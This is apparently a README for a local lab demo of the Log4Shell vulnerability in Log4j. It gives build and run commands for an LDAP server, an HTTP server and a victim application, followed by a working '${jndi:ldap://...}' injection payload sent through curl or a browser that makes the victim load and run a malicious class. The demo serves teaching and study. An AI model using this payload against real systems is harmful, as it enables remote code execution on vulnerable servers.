# Demo Project for the Log4j vulnerability

## Setup

1. Install a Java SDK. It works e.g. with Oracle SDK Version 8 or OpenJDK Version 11
2. Clone this project:
```
git clone https://github.com/dmancloud/log4j-shell-poc
```

3. Go into the folder:
   
```
cd log4j-log4shell-exploit
```

## Run the demo

On Windows use `mvnw.cmd` instead of `./mvnw`

1.) Build the project:

```
./mvnw package
```

2. Start the LdapServer:

```
./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
```

2.) Start the HttpServer:

```
./mvnw exec:java -D"exec.mainClass"="de.predic8.HttpServer"
```

3.) Start the victim:

```
./mvnw exec:java -D"exec.mainClass"="de.predic8.Opfer"
```

4.) Use curl or your browser to invoke the following URL:

```
curl 'http://localhost:8000/hallo?name=$\{jndi:ldap://localhost:10389/cn=badcode,dc=predic8,dc=de\}'
```

or open in your browser:

```
http://localhost:8000/hallo?name=${jndi:ldap://localhost:10389/cn=badcode,dc=predic8,dc=de}
```

The victim application will write into its log and the ldap query will be executed. The result of the Ldap query will make the victim loading the malicious class from the HTTP server and executing it.
